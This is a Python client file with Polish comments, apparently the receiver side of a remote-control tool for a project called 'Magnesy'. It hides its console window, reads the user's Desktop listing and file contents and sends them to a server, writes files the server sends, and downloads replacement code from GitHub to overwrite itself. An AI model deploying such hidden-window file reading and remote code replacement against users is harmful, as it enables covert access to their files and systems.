import ctypes
import socket
import threading
from colorama import Fore, Style
import os
import sys
import requests
from colorama import init, Fore, Style
import time
import os
import subprocess
from win10toast import ToastNotifier  # Import modułu do obsługi powiadomień
from szyfrowanie import szyfrowanie, odszyfrowywanie
from PyQt5.QtWidgets import QMessageBox, QPushButton, QFileDialog
import tkinter.messagebox
import messagebox
from PyQt5.QtCore import Qt, QTimer, QThread, pyqtSignal, QCoreApplication
from PyQt5.QtGui import QPalette, QColor, QIcon
from PyQt5.QtWidgets import QApplication, QWidget, QGridLayout, QPushButton, QDoubleSpinBox, QLabel, QSpinBox, QTextEdit, QProgressBar

import win32com.client

import pythoncom

import urllib
init()
global console_handle
# Ustawiamy numer ID okna konsoli
console_handle = ctypes.windll.kernel32.GetConsoleWindow()

# Minimalizowanie cmd
ctypes.windll.user32.ShowWindow(console_handle, 0)

ilosc_bledow = 0  # Inicjalizacja zmiennej ilosc_bledow
global pia_reset

pia_reset = 0

os.system('cls')  # W przypadku Windows, używamy polecenia cls
print('Dziennik działań:')

# Inicjalizacja obiektu do obsługi powiadomień
toaster = ToastNotifier()

def czytaj_folder(nazwa_folderu, server_socket):
    try:
        # Pobierz ścieżkę do folderu na pulpicie
        desktop_path = os.path.join(os.path.join(
            os.environ['USERPROFILE']), 'Desktop')
        folder_path = os.path.join(desktop_path, nazwa_folderu)

        # Sprawdź czy podany folder istnieje
        if os.path.exists(folder_path) and os.path.isdir(folder_path):
            # Odczytaj zawartość folderu
            folder_contents = os.listdir(folder_path)
            zawartosc_folderu = '\n'.join(folder_contents)
            formatted_response = f'Zawartość folderu "{nazwa_folderu}":\n{zawartosc_folderu}'
            # Wyślij zawartość folderu na serwer
            server_socket.sendall(szyfrowanie(formatted_response).encode())
        else:
            # Jeśli folder nie istnieje, wyślij informację o tym na serwer
            message = f'Folder "{nazwa_folderu}" nie istnieje na pulpicie.'
            server_socket.sendall(szyfrowanie(message).encode())
    except Exception as e:
        # W przypadku błędu, wyślij informację o błędzie na serwer
        error_message = f'Wystąpił błąd podczas odczytu folderu: {e}'
        server_socket.sendall(szyfrowanie(error_message).encode())


def utworz_plik(server_socket, nazwa_pliku, zawartosc):
    try:
        # Utwórz plik na pulpicie odbiorcy
        sciezka_pliku = os.path.join(os.path.join(
            os.environ['USERPROFILE']), 'Desktop', nazwa_pliku)
        # Dodano argument 'encoding' dla poprawnego kodowania tekstu
        with open(sciezka_pliku, 'w', encoding='utf-8') as file:
            # Zapisz zawartość do pliku
            file.write(zawartosc.replace("\\n", "\n"))  # Zamiana '\\n' na '\n'
        print(f'Utworzono plik {nazwa_pliku} na pulpicie odbiorcy.')
        # Wyślij potwierdzenie o utworzeniu pliku na serwer
        server_socket.sendall(szyfrowanie(
            f'Utworzono plik {nazwa_pliku} na pulpicie odbiorcy.').encode())
    except Exception as e:
        print(f'Wystąpił błąd podczas tworzenia pliku: {e}')
        # Wyślij informację o błędzie na serwer
        server_socket.sendall(szyfrowanie(
            f'Błąd podczas tworzenia pliku {nazwa_pliku}.').encode())


def odczytaj_dane_pliku(server_socket, nazwa_pliku):
    try:
        # Sprawdź czy plik istnieje na pulpicie
        sciezka_pliku = os.path.join(os.path.join(
            os.environ['USERPROFILE']), 'Desktop', nazwa_pliku)
        if os.path.exists(sciezka_pliku):
            # Otwórz plik i odczytaj jego zawartość
            with open(sciezka_pliku, 'r') as file:
                zawartosc = file.read()
            # Wyślij zawartość pliku na serwer
            server_socket.sendall(szyfrowanie(zawartosc).encode())
            print(f'Zawartość pliku {nazwa_pliku} została wysłana na serwer.')
        else:
            print(f'Plik {nazwa_pliku} nie istnieje na pulpicie.')
    except Exception as e:
        print(f'Wystąpił błąd podczas odczytu pliku: {e}')


def Pia_inna(server_socket):
    try:  # Tego pliku nie ma w repozytorium
        subprocess.run(['python', 'Inne_plecenia_s.py'])
    except:
        pass


def odczytaj_zawartosc_pulpitu(server_socket):
    try:
        desktop_path = os.path.join(os.path.join(
            os.environ['USERPROFILE']), 'Desktop')
        desktop_contents = os.listdir(desktop_path)
        zawartosc_pulpitu = '\n'.join(desktop_contents)
        formatted_response = "Zawartość pulpitu:\n" + zawartosc_pulpitu
        # Zamiast używać tabulatorów, użyjmy kilku znaków spacji
        formatted_response = formatted_response.replace('\t', '    ')
        server_socket.sendall(szyfrowanie(formatted_response).encode())
    except Exception as e:
        error_message = f'Wystąpił błąd podczas odczytu zawartości pulpitu: {e}'
        server_socket.sendall(szyfrowanie(error_message).encode())
        print(error_message)


def tworzenie_ikonki():
    # Inicjalizacja COM
    pythoncom.CoInitialize()

    def find_folders_with_main2_and_rei(desktop_path):
        # Lista przechowująca ścieżki do folderów, w których znaleziono plik main2.py i folder rei
        folders_found = []

        # Przeszukaj wszystkie foldery na pulpicie
        for root, dirs, files in os.walk(desktop_path):
            if "main2.py" in files and "rei" in dirs:
                # Znaleziono folder zawierający zarówno plik main2.py, jak i folder rei
                folders_found.append(root)

        return folders_found

    def create_shortcut(target, shortcut_name, icon_path=None):
        # Pobierz ścieżkę do pulpitu
        desktop_path = os.path.join(os.path.join(
            os.environ['USERPROFILE']), 'Desktop')

        # Sprawdź, czy istnieje skrót o tej samej ścieżce docelowej na pulpicie i usuń go, jeśli istnieje
        existing_shortcut = os.path.join(
            desktop_path, f'{shortcut_name}.lnk')
        if os.path.exists(existing_shortcut):
            os.remove(existing_shortcut)

        # Utwórz obiekt skrótu
        shell = win32com.client.Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(
            os.path.join(desktop_path, f'{shortcut_name}.lnk'))

        # Ustaw właściwości skrótu
        shortcut.Targetpath = target
        if icon_path:
            shortcut.IconLocation = icon_path

        # Ustaw miejsce rozpoczęcia
        shortcut.WorkingDirectory = os.path.dirname(target)
        # Zapisz skrót
        shortcut.save()

    def select_folder_and_create_shortcut():
        # Pobierz ścieżkę do pulpitu
        desktop_path = os.path.join(os.path.join(
            os.environ['USERPROFILE']), 'Desktop')

        # Znajdź foldery zawierające zarówno plik main2.py, jak i folder rei
        folders_found = find_folders_with_main2_and_rei(desktop_path)

        if len(folders_found) == 1:
            selected_folder_path = folders_found[0]
        else:
            return

        # Utwórz ścieżkę do pliku ikony
        icon_path = os.path.join(selected_folder_path, "rei", "icon.ico")

        # Utwórz skrót na pulpicie do pliku main2.py w wybranym folderze
        create_shortcut(os.path.join(selected_folder_path,
                        "main2.py"), "Magnesy", icon_path)

    select_folder_and_create_shortcut()

    # Zwalnianie zasobów COM
    pythoncom.CoUninitialize()

    return

def Pia_aktul(server_socket):
    global pia_reset
    try:
        server_socket.sendall(
            "$ Wykonywanie funkcji".encode())
        # Lista adresów URL plików do pobrania
        urls = [
            "https://raw.githubusercontent.com/Ksao0/Repozytorium-magnesy-t/main/Wstepna/Testo/Odbiorca_f.py",
            "https://raw.githubusercontent.com/Ksao0/Repozytorium-magnesy-t/main/Wstepna/Testo/Odbiorca.py",
            "https://raw.githubusercontent.com/Ksao0/Repozytorium-magnesy-t/main/Wstepna/Testo/main2.py",
        ]

        for url in urls:
            response = requests.get(url)
            if response.status_code == 200:
                file_data = response.content
                filename = os.path.basename(url)

                with open(filename, 'wb') as file:
                    file.write(file_data)
            else:
                print(
                    Fore.MAGENTA + "Polecenie serwera nie mogło zostać wykonane" + Style.RESET_ALL)
                server_socket.sendall(
                    "Polecenie serwera nie mogło zostać wykonane".encode())
        pia_reset = 1
    except Exception as e:
        print(Fore.RED + "Wystąpił błąd podczas wykonywania polecenia:", e)
        print(Style.RESET_ALL)
        # Wysłanie komunikatu do serwera w przypadku błędu
        server_socket.sendall(
            "Polecenie serwera nie mogło zostać wykonane [0]".encode())


# Funkcja do obsługi powiadomień
def show_notification(title, message, notification_type, server_socket):
    # Wybierz rodzaj powiadomienia na podstawie przekazanego parametru
    if notification_type == "info":
        messagebox.showinfo(
            title, f"{message}\n\nPo odczytaniu tego powiadomienia wyślij dowolną wiadomość do serwera dwa razy!")
    elif notification_type == "warning":
        messagebox.showwarning(
            title, f"{message}\n\nPo odczytaniu tego powiadomienia wyślij dowolną wiadomość do serwera dwa razy!")
    elif notification_type == "error":
        messagebox.showerror(
            title, f"{message}\n\nPo odczytaniu tego powiadomienia wyślij dowolną wiadomość do serwera dwa razy!")
    else:
        print("Nieznany rodzaj powiadomienia")
        toaster.show_toast(
            f"Utracono połączenie z serwerem [0]", "Spróbuj wysłac 2-3 wiadomości na serwer, aby połączyć")